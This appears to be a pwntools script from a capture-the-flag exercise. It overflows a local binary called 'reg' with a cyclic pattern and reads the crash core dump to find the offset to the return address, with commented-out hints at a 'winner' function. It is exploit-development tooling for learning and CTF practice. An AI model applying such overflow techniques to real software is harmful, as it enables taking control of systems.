
from pwn import *

#context.log_level = 'DEBUG'
context(os='linux', arch='amd64')

executable = '/home/kali/Downloads/reg'

#padding_length = 56
#ret_offset = -96
#winner_address = '0x401206'

elf = context.binary = ELF(executable)

log.info('Get Addresses')
#info("%#x run", elf.symbols.run)
#info("%#x winner", elf.symbols.winner)

info("%s symbols", elf.symbols)
#info("%s plt", elf.plt)
#info("%s got", elf.got)
#info("%s libs", elf.libs)


log.info('Create IO')
#io = remote('', )
io = process(executable)

log.info('Send Command flag')
#io.sendlineafter('>>', 'flag')
io.sendline('flag')

#log.info('Send Command hof')
#io.sendlineafter('>> ', 'hof')

payload = cyclic(200)

log.info('Send Payload')
io.sendlineafter('flag: ', payload)

io.wait()

core = io.corefile
stack = core.rsp
info("rsp = %#x", stack)
pattern = core.read(stack, 4)
info("cyclic pattern = %s", pattern.decode())
rip_offset = cyclic_find(pattern)
info("rip offset is = %d", rip_offset)

io.interactive()

